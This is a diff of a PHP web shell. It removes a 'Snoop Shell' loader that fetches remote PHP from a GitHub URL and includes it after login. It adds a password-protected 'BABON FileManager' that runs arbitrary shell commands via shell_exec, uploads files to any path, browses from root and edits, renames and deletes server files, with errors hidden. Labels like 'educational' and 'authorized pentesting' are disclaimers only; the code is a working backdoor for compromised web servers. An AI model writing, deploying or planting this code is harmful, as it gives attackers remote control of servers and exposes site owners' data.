@@ -1,119 +1,446 @@
 <?php
-/**
- * Snoop Shell v2 – Secure Educational Shell
- * Author: EduSecure
- * Note: Gunakan hanya di lab, sandbox, atau lingkungan pribadi.
- */
-
 session_start();
-error_reporting(0);
 
-// ====== Konfigurasi Utama ======
-define('ZPASSWORD_HASH', '$2y$10$POGWvpSABO4dZsol.Cm.rueYu9jnrN1qWeQ.wQN7To0lNWTRWqHli'); // password hash
-define('SESSION_TIMEOUT', 900); // 15 menit
-define('REMOTE_CODE_URL', 'https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfanopass.txt');
+$USERNAME = "punisher";
 
-// ====== Keamanan Session ======
-if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > SESSION_TIMEOUT) {
+$PASSWORD_HASH = '$2y$10$/NJ7xGyrdl/yS35sncrdIed7/eof8SzQp8lmSaBbzGKMoJZLnDC8W'; 
+
+if (isset($_GET['logout'])) {
     session_destroy();
-    header("Location: " . $_SERVER['PHP_SELF']);
+    header("Location: ?");
     exit();
 }
-$_SESSION['last_activity'] = time();
 
-function is_logged_in() {
-    return isset($_SESSION['snoop_logged_in']) && $_SESSION['snoop_logged_in'] === true;
-}
+// Proses login
+if (isset($_POST['login'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
 
-function hex2str($hex) {
-    $str = '';
-    for ($i = 0; $i < strlen($hex); $i += 2) {
-        $str .= chr(hexdec(substr($hex, $i, 2)));
-    }
-    return $str;
-}
-
-function get_remote_script($url) {
-    $methods = [
-        'curl_exec'    => 'curl_exec',
-        'file_get'     => 'file_get_contents',
-        'stream_get'   => function($url) {
-            $handle = @fopen($url, "r");
-            if ($handle) {
-                $data = @stream_get_contents($handle);
-                fclose($handle);
-                return $data;
-            }
-            return false;
-        }
-    ];
-
-    if (function_exists('curl_exec')) {
-        $ch = curl_init($url);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_USERAGENT      => "Mozilla/5.0",
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-        ]);
-        $result = curl_exec($ch);
-        curl_close($ch);
-        return $result;
-    } elseif (function_exists('file_get_contents')) {
-        return @file_get_contents($url);
-    } elseif (function_exists('stream_get_contents')) {
-        return $methods['stream_get']($url);
-    }
-
-    return false;
-}
-
-if (is_logged_in()) {
-    $payload = get_remote_script(REMOTE_CODE_URL);
-
-    if ($payload !== false && str_starts_with(trim($payload), "<?php")) {
-        $temp = tempnam(sys_get_temp_dir(), 'zh_') . '.php';
-        file_put_contents($temp, $payload);
-        include $temp;
-        unlink($temp);
+    if ($username === $USERNAME && password_verify($password, $PASSWORD_HASH)) {
+        $_SESSION['loggedin'] = true;
     } else {
-        echo "<div style='color:red;text-align:center;margin-top:2rem;'>Gagal memuat skrip eksternal atau tidak valid.</div>";
+        echo "<script>alert('PASSWORD NYA SALAH TOLOL!');</script>";
     }
+}
 
-} else {
-    // Proses Login
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-        if (password_verify($_POST['password'], ZPASSWORD_HASH)) {
-            $_SESSION['snoop_logged_in'] = true;
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
-        } else {
-            $error = "Password salah.";
-        }
-    }
-
-    // Halaman Login
-    ?>
-    <!DOCTYPE html>
-    <html lang="id">
+// Jika belum login, tampilkan form login
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    echo '<!DOCTYPE html>
+    <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Snoop Shell Login</title>
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+        <title>Login</title>
+        <style>
+            body {
+                background: #111; 
+                color: white;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+                font-family: Arial, sans-serif;
+                font-size: 14px; /* font size 14px hanya untuk tampilan HTML */
+            }
+            .login-container {
+                text-align: center;
+                background: transparent; /* transparan total */
+                padding: 20px;
+                border-radius: 10px;
+            }
+            .login-container h2 {
+                margin-bottom: 20px;
+                font-size: 1.5em;
+            }
+            .form-group {
+                margin-bottom: 15px;
+                text-align: left;
+            }
+            label {
+                display: block;
+                margin-bottom: 5px;
+                font-size: 0.9em;
+            }
+            input {
+                width: 250px;
+                padding: 10px;
+                border: 1px solid #444;
+                border-radius: 6px;
+                background: rgba(0,0,0,0.2);
+                color: white;
+                font-size: 1em;
+            }
+            input::placeholder {
+                color: #bbb;
+            }
+            button {
+                width: 100%;
+                padding: 10px;
+                background: #00cfff;
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 1em;
+                cursor: pointer;
+            }
+            button:hover {
+                background: #00a5cc;
+            }
+            .login-logo {
+                display: block;
+                margin: 0 auto;
+                width: 120px;
+            }
+            .login-title {
+                margin-top: 10px;
+                margin-bottom: 20px;
+            }
+        </style>
     </head>
-    <body class="bg-dark text-light d-flex justify-content-center align-items-center vh-100">
-        <div class="container text-center">
-            <h2>Let's Fly High!</h2>
-            <?php if (isset($error)) echo "<div class='alert alert-danger mt-3'>$error</div>"; ?>
-            <form method="POST" class="mt-4">
-                <input type="password" name="password" class="form-control mb-3" placeholder="Masukkan Password" required>
-                <button type="submit" class="btn btn-primary">Masuk</button>
+    <body>
+        <div class="login-container">
+            <img src="https://i.gyazo.com/0b785f3814f29a85c3cfddaac5cd886d.png" alt="Logo" class="login-logo">
+            <h2 class="login-title">Login</h2>
+            <form method="POST">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" name="username" placeholder="Masukkan username" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Masukkan password" required>
+                </div>
+                <button type="submit" name="login">Login</button>
             </form>
         </div>
     </body>
-    </html>
-    <?php
+    </html>';
+    exit();
 }
 ?>
+
+
+<?php
+error_reporting(0);
+@ini_set('display_errors', 0);
+
+// === BABON FILEMANAGER v2.5 === //
+define('VERSION', '2.5');
+define('AUTHOR', 'BABON');
+
+// Fungsi aman
+function r($f){return @file_get_contents($f);}
+function w($f,$c){return @file_put_contents($f,$c);}
+function d($p){return @is_dir($p);}
+function f($p){return @is_file($p);}
+function x($c){return @shell_exec($c);}
+
+// === NAVIGASI DIREKTORI ===
+$root = '/';
+$dir = realpath(@$_REQUEST['dir'] ?: getcwd());
+if(!$dir || !d($dir)) $dir = realpath(getcwd());
+@chdir($dir);
+
+$parent = realpath($dir.'/..');
+
+// Ganti direktori
+if(isset($_POST['godir'])){
+    $new = realpath($_POST['path']);
+    if($new && d($new) && strpos($new, $root)===0){
+        $dir = $new;
+        @chdir($dir);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BABON FileManager v<?php echo VERSION; ?></title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0d1117;
+            --card: #161b22;
+            --border: #30363d;
+            --text: #f0f6fc;
+            --accent: #58a6ff;
+            --danger: #f85149;
+            --success: #3fb950;
+            --warning: #d29922;
+            --purple: #bc8cff;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: auto; }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--card), #1a1f2e);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            background: linear-gradient(45deg, var(--accent), var(--purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        .tagline { font-size: 0.9rem; color: #8b949e; }
+        .path-bar {
+            background: var(--card);
+            padding: 12px 16px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .path-bar input { flex: 1; min-width: 200px; }
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            font-family: inherit;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.9rem;
+        }
+        .btn-primary { background: var(--accent); color: white; }
+        .btn-secondary { background: var(--card); color: var(--text); border: 1px solid var(--border); }
+        .btn-danger { background: var(--danger); color: white; }
+        .btn-success { background: var(--success); color: white; }
+        .btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+        }
+        input, textarea, select {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 10px;
+            border-radius: 6px;
+            font-family: inherit;
+            width: 100%;
+        }
+        textarea { resize: vertical; min-height: 150px; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { background: rgba(88,166,255,0.1); color: var(--accent); }
+        tr:hover { background: rgba(255,255,255,0.03); }
+        a { color: var(--accent); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .actions a { margin-right: 12px; font-size: 0.9rem; }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #8b949e;
+            font-size: 0.8rem;
+        }
+        .badge {
+            background: var(--purple);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
+        .flex > * { flex: 1; min-width: 280px; }
+        @media (max-width: 768px) {
+            .flex { flex-direction: column; }
+            .logo { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- HEADER -->
+    <header>
+        <div class="logo">BABON</div>
+        <div class="tagline">FileManager v<?php echo VERSION; ?> • LiteSpeed Safe Edition</div>
+    </header>
+
+    <!-- PATH BAR -->
+    <div class="path-bar">
+        <form method="post" class="flex" style="align-items:center;">
+            <input name="path" placeholder="Enter path: /var/www, /home/user, /etc" value="<?php echo htmlspecialchars($dir); ?>">
+            <button type="submit" name="godir" class="btn btn-primary">Go</button>
+        </form>
+        <div style="margin-top:8px; display:flex; gap:5px; flex-wrap:wrap;">
+            <form method="post" style="display:inline;">
+                <input type="hidden" name="path" value="<?php echo $root; ?>">
+                <button type="submit" name="godir" class="btn btn-secondary">Root (/)</button>
+            </form>
+            <?php if($parent && $parent != $dir): ?>
+            <form method="post" style="display:inline;">
+                <input type="hidden" name="path" value="<?php echo $parent; ?>">
+                <button type="submit" name="godir" class="btn btn-secondary">.. (Parent)</button>
+            </form>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <div class="flex">
+
+        <!-- COMMAND EXECUTION -->
+        <div class="card">
+            <h3>Command Terminal <span class="badge">shell_exec</span></h3>
+            <form method="post">
+                <input name="cmd" placeholder="id; whoami; pwd; uname -a" autofocus>
+                <button type="submit" class="btn btn-primary" style="margin-top:8px;">Execute</button>
+            </form>
+            <?php if(isset($_POST['cmd'])): ?>
+            <pre style="background:#000;padding:12px;border-radius:6px;margin-top:10px;max-height:200px;overflow:auto;border:1px solid var(--border);">
+<?php echo htmlspecialchars(x($_POST['cmd'])); ?>
+            </pre>
+            <?php endif; ?>
+        </div>
+
+        <!-- UPLOAD FILE -->
+        <div class="card">
+            <h3>Upload File</h3>
+            <form method="post" enctype="multipart/form-data">
+                <input type="file" name="file" required>
+                <input name="uppath" placeholder="Destination (optional)" value="<?php echo htmlspecialchars($dir); ?>">
+                <button type="submit" class="btn btn-success" style="margin-top:8px;">Upload</button>
+            </form>
+            <?php
+            if(isset($_FILES['file']) && $_FILES['file']['error']==0){
+                $dest = $_POST['uppath'] ? rtrim($_POST['uppath'],'/').'/' : $dir.'/';
+                $dest .= $_FILES['file']['name'];
+                if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
+                    echo "<p style='color:var(--success);margin-top:10px;'>Uploaded: <code>$dest</code></p>";
+                } else echo "<p style='color:var(--danger);'>Upload failed!</p>";
+            }
+            ?>
+        </div>
+
+    </div>
+
+    <!-- FILE LIST -->
+    <div class="card">
+        <h3>Directory: <code><?php echo htmlspecialchars($dir); ?></code></h3>
+        <table>
+            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Type</th><th class="actions">Actions</th></tr>
+            <?php
+            $files = @scandir($dir);
+            if($files) foreach($files as $file){
+                if($file=='.' || $file=='..') continue;
+                $path = $dir.'/'.$file;
+                $size = f($path) ? formatBytes(filesize($path)) : '-';
+                $perm = substr(sprintf('%o', fileperms($path)), -4);
+                $type = f($path) ? 'file' : (d($path) ? 'dir' : 'unknown');
+                $url = urlencode($path);
+                $isDir = d($path);
+                echo "<tr>
+                <td><a href='?dir=$url' style='color:".($isDir?'var(--purple)': 'var(--accent)').";'>".($isDir?'<b>📁 ':'')."$file</a></td>
+                <td>$size</td>
+                <td><code>$perm</code></td>
+                <td><span class='badge' style='background:".($isDir?'var(--purple)': 'var(--accent)').";'>$type</span></td>
+                <td class='actions'>
+                    <a href='?edit=$url&dir=".urlencode($dir)."'>Edit</a> |
+                    <a href='?rename=$url&dir=".urlencode($dir)."'>Rename</a> |
+                    <a href='?del=$url&dir=".urlencode($dir)."' onclick='return confirm(\"Delete $file?\")' style='color:var(--danger);'>Delete</a>
+                </td></tr>";
+            }
+            ?>
+        </table>
+    </div>
+
+    <!-- EDIT FILE -->
+    <?php if(isset($_GET['edit'])){ $file = $_GET['edit']; if(f($file)): ?>
+    <div class="card">
+        <h3>Edit File: <code><?php echo htmlspecialchars($file); ?></code></h3>
+        <form method="post">
+            <textarea name="content"><?php echo htmlspecialchars(r($file)); ?></textarea>
+            <input type="hidden" name="file" value="<?php echo $file; ?>">
+            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
+            <button name="save" class="btn btn-success" style="margin-top:10px;">Save Changes</button>
+        </form>
+    </div>
+    <?php endif; } ?>
+
+    <!-- RENAME FILE -->
+    <?php if(isset($_GET['rename'])){ $file = $_GET['rename']; if(f($file) || d($file)): ?>
+    <div class="card">
+        <h3>Rename / Move</h3>
+        <form method="post">
+            <input name="old" value="<?php echo $file; ?>" readonly style="margin-bottom:8px;">
+            <input name="new" placeholder="New name or full path" required>
+            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
+            <button name="doren" class="btn btn-primary" style="margin-top:8px;">Apply</button>
+        </form>
+    </div>
+    <?php endif; } ?>
+
+    <!-- SAVE & RENAME ACTIONS -->
+    <?php
+    if(isset($_POST['save'])){
+        if(w($_POST['file'], $_POST['content'])){
+            echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);'>File saved successfully!</p></div>";
+        }
+    }
+    if(isset($_POST['doren'])){
+        if(@rename($_POST['old'], $_POST['new'])){
+            echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);'>Renamed/Moved!</p></div>";
+        } else {
+            echo "<div class='card' style='border-color:var(--danger);'><p style='color:var(--danger);'>Failed!</p></div>";
+        }
+    }
+    if(isset($_GET['del'])){
+        $target = $_GET['del'];
+        if(f($target)) @unlink($target);
+        elseif(d($target)) @rmdir($target);
+        header("Location: ?dir=".urlencode($dir));
+        exit;
+    }
+    ?>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <p>© <?php echo date('Y'); ?> <b>BABON FileManager</b> • Built for Authorized Pentesting Only</p>
+        <p>Server: <code><?php echo htmlspecialchars(x('uname -a')); ?></code> | User: <code><?php echo htmlspecialchars(x('whoami')); ?></code></p>
+    </div>
+
+</div>
+
+<?php
+function formatBytes($size, $precision = 2) {
+    $base = log($size, 1024);
+    $suffixes = array('B', 'KB', 'MB', 'GB', 'TB');
+    return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
+}
+?>
+</body>
+</html>
